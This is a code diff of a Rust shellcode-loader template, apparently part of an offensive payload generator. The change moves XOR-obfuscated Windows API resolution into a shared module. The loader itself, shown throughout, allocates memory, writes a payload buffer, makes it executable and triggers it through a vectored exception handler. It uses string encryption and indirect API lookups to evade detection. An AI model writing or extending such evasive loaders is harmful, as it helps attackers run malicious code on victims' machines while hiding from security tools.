@@ -5,13 +5,11 @@
 {{LITCRYPT_SETUP}}
 {{COMMON_MODULE}}
 
-use std::ffi::CString;
 use std::ptr::null_mut;
 
 use winapi::{
     um::{
         winnt::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_RESERVE, PEXCEPTION_POINTERS, EXCEPTION_RECORD, PEXCEPTION_RECORD, PCONTEXT},
-        libloaderapi::{GetModuleHandleA, GetProcAddress},
     },
     shared::{
         ntdef::{NT_SUCCESS, HANDLE},
@@ -53,26 +51,6 @@ unsafe extern "system" fn veh_handler(_exception_info: PEXCEPTION_POINTERS) -> i
     EXCEPTION_CONTINUE_EXECUTION
 }
 
-fn deobfuscate_bytes(d: &[u8]) -> Vec<u8> {
-    d.iter().map(|b| b ^ K).collect()
-}
-
-unsafe fn resolve_nt_api_address(n: &[u8]) -> *const () {
-    let ntdll = CString::new(lc!("ntdll")).unwrap();
-    let h = GetModuleHandleA(ntdll.as_ptr());
-    let s = deobfuscate_bytes(n);
-    let c = CString::new(s).unwrap();
-    GetProcAddress(h, c.as_ptr()) as *const ()
-}
-
-unsafe fn resolve_kernel32_api_address(n: &[u8]) -> *const () {
-    let kernel32 = CString::new(lc!("kernel32")).unwrap();
-    let h = GetModuleHandleA(kernel32.as_ptr());
-    let s = deobfuscate_bytes(n);
-    let c = CString::new(s).unwrap();
-    GetProcAddress(h, c.as_ptr()) as *const ()
-}
-
 type FnNtAllocateVirtualMemory = unsafe extern "system" fn(
     HANDLE,
     *mut *mut c_void,
@@ -109,7 +87,7 @@ fn allocate_rw_memory(size: usize) -> Option<*mut c_void> {
     let current_process: HANDLE = -1isize as HANDLE;
 
     unsafe {
-        let f_alloc: FnNtAllocateVirtualMemory = std::mem::transmute(resolve_nt_api_address(OBF_NT_ALLOCATE_VIRTUAL_MEMORY));
+        let f_alloc: FnNtAllocateVirtualMemory = std::mem::transmute(common::resolve_nt_api_address(OBF_NT_ALLOCATE_VIRTUAL_MEMORY, K));
 
         let mut base: *mut c_void = null_mut();
         let mut alloc_size = size;
@@ -135,7 +113,7 @@ fn write_to_memory(destination: *mut c_void, source: &[u8]) -> bool {
     let current_process: HANDLE = -1isize as HANDLE;
 
     unsafe {
-        let f_write: FnNtWriteVirtualMemory = std::mem::transmute(resolve_nt_api_address(OBF_NT_WRITE_VIRTUAL_MEMORY));
+        let f_write: FnNtWriteVirtualMemory = std::mem::transmute(common::resolve_nt_api_address(OBF_NT_WRITE_VIRTUAL_MEMORY, K));
 
         let mut written: usize = 0;
         let status = f_write(
@@ -154,7 +132,7 @@ fn change_protection_to_rx(mut address: *mut c_void, size: usize) -> bool {
     let current_process: HANDLE = -1isize as HANDLE;
 
     unsafe {
-        let f_protect: FnNtProtectVirtualMemory = std::mem::transmute(resolve_nt_api_address(OBF_NT_PROTECT_VIRTUAL_MEMORY));
+        let f_protect: FnNtProtectVirtualMemory = std::mem::transmute(common::resolve_nt_api_address(OBF_NT_PROTECT_VIRTUAL_MEMORY, K));
 
         let mut old_protect: u32 = 0;
         let mut region_size = size;
@@ -172,14 +150,14 @@ fn change_protection_to_rx(mut address: *mut c_void, size: usize) -> bool {
 }
 
 unsafe fn register_veh_handler() -> bool {
-    let f_add_veh: FnAddVectoredExceptionHandler = std::mem::transmute(resolve_kernel32_api_address(OBF_ADD_VECTORED_EXCEPTION_HANDLER));
+    let f_add_veh: FnAddVectoredExceptionHandler = std::mem::transmute(common::resolve_kernel32_api_address(OBF_ADD_VECTORED_EXCEPTION_HANDLER, K));
     
     let result = f_add_veh(1, veh_handler);
     !result.is_null()
 }
 
 unsafe fn raise_exception() {
-    let f_raise: FnNtRaiseException = std::mem::transmute(resolve_nt_api_address(OBF_NT_RAISE_EXCEPTION));
+    let f_raise: FnNtRaiseException = std::mem::transmute(common::resolve_nt_api_address(OBF_NT_RAISE_EXCEPTION, K));
     
     // Create exception record for division by zero
     let mut exception_record: EXCEPTION_RECORD = std::mem::zeroed();
@@ -198,12 +176,9 @@ unsafe fn raise_exception() {
 }
 
 fn execute_via_veh(mut buf: Vec<u8>) {
-    let base = allocate_rw_memory(buf.len());
-    if base.is_none() {
+    let Some(base) = allocate_rw_memory(buf.len()) else {
         return;
-    }
-
-    let base = base.unwrap();
+    };
 
     if !write_to_memory(base, &buf) {
         return;
